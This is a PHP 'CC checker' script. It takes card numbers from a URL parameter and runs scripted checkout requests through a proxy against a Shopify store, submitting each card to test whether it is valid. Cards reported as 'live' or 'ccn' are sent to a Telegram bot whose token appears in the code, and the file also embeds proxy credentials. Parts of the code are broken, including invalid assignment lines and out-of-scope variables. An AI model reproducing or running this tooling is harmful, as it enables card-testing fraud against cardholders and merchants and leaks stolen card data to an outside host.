<?php

##API MADE BY ENDERFLY#
#JOIN NMB X RDXZ#

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

//===============[ PROXY ]===================//
function get_random_string($length) {
// Genera una cadena de texto aleatoria.
$letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$result_str = '';
for ($i = 0; $i < $length; $i++) {
$result_str .= $letters[rand(0, strlen($letters) - 1)];
}
return $result_str;
}
$atv = get_random_string(86);
if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};
//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
    
$lista = $_GET['cc'];
$lista_count = substr_count($lista, '|');
if ($lista_count != 3) {
	echo'{"error":"Ccs Not Work Ex: cc|mes|ano|cvv"}';
	exit();
}
$bl = "578200206xxxxxxx";

function generateRandomDigit() {
    return mt_rand(1, 9);
}

$bl = preg_replace_callback('/x/', function() {
    return generateRandomDigit();
}, $bl);
$cl1 = sprintf('%02d', rand(1, 12));
$cl2 = rand(1, 9);
$cl3 = rand(100, 900);
$liss = "$bl|$cl1|202$cl2|$cl3";
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$last4 = substr($cc, -4);
$ano1 = substr($ano, 2, 4);
$anz = substr($cc, -4);
$c1 = substr($cc, 0, 4);
$ex = substr($cc, 0, 12);
$binnerd = substr($cc, 0, 6);
$c2 = substr($cc, 4, 4);
$mes1 = substr($mes, 1, 1);
$ccns = ''.$c1.' '.$c2.' '.$c3.' '.$c4.'';
$c3 = substr($cc, 8, 4);
$c4 = substr($cc, 12, 4);

//TG
function tglive() {
$botToken = '6931478546:AAHO4THhXbByV5Jy01xWlLxLKTjSry2Eums';
$chatId = '6083180749';
$msg = "CC: $lista\nType:live";
$msg1 = urlencode($msg);
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg1&parse_mode=html&disable_web_page_preview=True";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
}
function tgccn() {
$botToken = '6931478546:AAHO4THhXbByV5Jy01xWlLxLKTjSry2Eums';
$chatId = '6083180749';
$msg = "CC: $lista\nType:ccn";
$msg1 = urlencode($msg);
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg1&parse_mode=html&disable_web_page_preview=True";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
}
//==============RDN========//
function random_string($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }

    return $randomString;
}

$usn = random_string(16);
$n = random_string(9);
$ln = random_string(9);
$rn = rand(11, 99);
$usa = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';
##proxy##
//rp.proxyscrape.com:6060:nz7llfklp9nqso6-country-us:zg62mglo4zhgixv
$pxusername = "06s5074ibvu1qjr";
$pxpassword = "i2iiso9xv9mlfku";
$pxhost = "rp.proxyscrape.com";
$pxport = "6060";
##url-req##
$url1 = 'https://www.showerbase.com/cart/add.js';
$url2 = 'https://www.showerbase.com/checkout';
$url4 = 'https://churchbiblepublishers.com/checkout/';
$url3 = 'https://api.stripe.com/v1/payment_methods';
$url5 = 'https://explodingtopics.com/stripe/create-subscription';
$binurl = 'https://aevnmohio.xyz/bin.php?bin='.$cc.'';
//================Get URL========//
//================= [ CURL REQUESTS ] =================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url1);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức G
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/json';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"items":[{"id":"24122394243","selling_plan":"","quantity":"1","properties":{}}]}');

$result1 = curl_exec($ch);
$web = trim(strip_tags(getStr($result1,'"web_url":"','"')));
//op
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPGET, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$url = $info['url'];
$a1 = trim(strip_tags(getStr($result2,'authenticity_token" value="','"')));
//req3
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức G
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$a1.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=vuonghoangnsos923%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=james&checkout%5Bshipping_address%5D%5Blast_name%5D=mohas&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=157+Allen+Street&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10002&checkout%5Bshipping_address%5D%5Bphone%5D=3129282828&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1068&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=420');

$result3 = curl_exec($ch);
$a2 = trim(strip_tags(getStr($result3,'authenticity_token" value="','"')));
//req4
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức G
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$a2.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Free%2520Shipping-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1068&checkout%5Bclient_details%5D%5Bbrowser_height%5D=657&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=420');

$result4 = curl_exec($ch);
//req5
$url6 = ''.$url.'?previous_step=shipping_method&step=payment_method';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url6);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPGET, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result5 = curl_exec($ch);
$pay = trim(strip_tags(getStr($result5,'data-select-gateway="','"')));
$total = trim(strip_tags(getStr($result5,'data-checkout-payment-due-target="','"')));
//req6
$url7 = "https://deposit.us.shopifycs.com/sessions";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url7);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức G
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/json';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"'.$n.' '.$ln.'","month":'.$mes1.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.showerbase.com"}');

$result6 = curl_exec($ch);
$tk = trim(strip_tags(getStr($result6,'{"id":"','"}')));
//req7
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức G
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$a2.'&previous_step=payment_method&step=&s='.$tk.'&checkout%5Bpayment_gateway%5D='.$pay.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=3129282828&checkout%5Btotal_price%5D='.$total.'&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=974&checkout%5Bclient_details%5D%5Bbrowser_height%5D=819&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');

$result7 = curl_exec($ch);
usleep(5000000);
//req8
$url9 = ''.$url.'?from_processing_page=1&validate=true';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url9);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pxusername.':'.$pxpassword);
curl_setopt($ch, CURLOPT_PROXY, $pxhost);
curl_setopt($ch, CURLOPT_PROXYPORT, $pxport);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPGET, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: www.showerbase.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'User-Agent: '.$usa.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result8 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result8,'notice__content"><p class="notice__text">','</p></div></div>')));
//===============REQ 3 =======================//

//===============[RESPONSES ]===================//

if(strpos($result5, '"result":"success"' )) {
    echo '"Done":"Done"';
}
elseif(strpos($result8, "Thank you for your Payment" )) {
	echo '{"status": "live", "cc": "' . $lista . '", "response": {"raw_msg": "Thank you for your Payment"}}';
	x = tglive();
}
elseif(strpos($result8, "Your order is confirmed" )) {
	echo '{"status": "live", "cc": "' . $lista . '", "response": {"raw_msg": "Your order is confirmed"}}';
	x = tglive();
}
elseif(strpos($result8, "Thank you" )) {
	echo '{"status": "live", "cc": "' . $lista . '", "response": {"raw_msg": "Thank you for your Payment"}}';
	x = tglive();
}
elseif(strpos($result8, "Security code was not matched by the processor" )) {
	echo '{"status": "ccn", "cc": "' . $lista . '", "response": {"raw_msg": "' . $msg . '"}}';
	x = tgccn();
}
elseif(strpos($result8, "Security codes does not match correct" )) {
	echo '{"status": "ccn", "cc": "' . $lista . '", "response": {"raw_msg": "' . $msg . '"}}';
	x = tgccn();
}
elseif(strpos($result8, "CVV2 Mismatch" )) {
	echo '{"status": "ccn", "cc": "' . $lista . '", "response": {"raw_msg": "' . $msg . '"}}';
	x = tgccn();
}
else {
    echo '{"status": "die", "cc": "' . $lista . '", "response": {"raw_msg": "' . $msg . '"}}';
}

@unlink('cookie.txt');
curl_close($ch);
ob_flush();
?>